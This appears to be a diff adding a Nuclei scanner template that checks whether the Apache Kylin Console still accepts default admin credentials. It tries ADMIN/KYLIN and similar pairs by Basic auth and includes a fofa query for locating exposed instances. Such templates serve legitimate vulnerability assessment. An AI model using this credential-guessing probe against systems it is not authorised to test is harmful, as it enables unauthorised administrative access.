@@ -1,0 +1,55 @@
+id: kylin-default-login
+
+info:
+  name: Apache Kylin Console - Default Login
+  author: SleepingBag945
+  severity: high
+  description: |
+    The default password for the Apache Kylin Console is KYLIN for the ADMIN user in Kylin versions before 3.0.0.
+  reference:
+    - https://github.com/hanc00l/pocGoby2Xray/blob/main/xraypoc/Apache_Kylin_Console_Default_password.yml
+    - https://github.com/Wker666/Demo/blob/main/script/%E6%BC%8F%E6%B4%9E%E6%8E%A2%E6%B5%8B/Kylin/Apache%20Kylin%20Console%20%E6%8E%A7%E5%88%B6%E5%8F%B0%E5%BC%B1%E5%8F%A3%E4%BB%A4.wker
+  metadata:
+    verified: true
+    max-request: 6
+    fofa-query: app="APACHE-kylin"
+  tags: kylin,default-login,apache
+
+http:
+  - raw:
+      - |
+        GET /kylin/api/user/authentication  HTTP/1.1
+        Host: {{Hostname}}
+        Authorization: Basic {{base64(username + ':' + password)}}
+
+    attack: clusterbomb
+    payloads:
+      username:
+        - ADMIN
+        - admin
+      password:
+        - KYLIN
+        - kylin
+        - 123456
+    stop-at-first-match: true
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '"userDetails":'
+          - '"username":'
+          - '"password":'
+        condition: and
+
+      - type: word
+        part: header
+        words:
+          - 'application/json'
+
+      - type: status
+        status:
+          - 200
+
+# digest: 490a0046304402201fcf0b913c72b187052e4b5e7871e7d0e5b5df5339bb686cba1d688f6b12ab5702201e25e7c9eaedcea9be02d16d4759ab89f87e1bbd505c6144f94e671bc2b25db0:922c64590222798bb761d5b6d8e72950
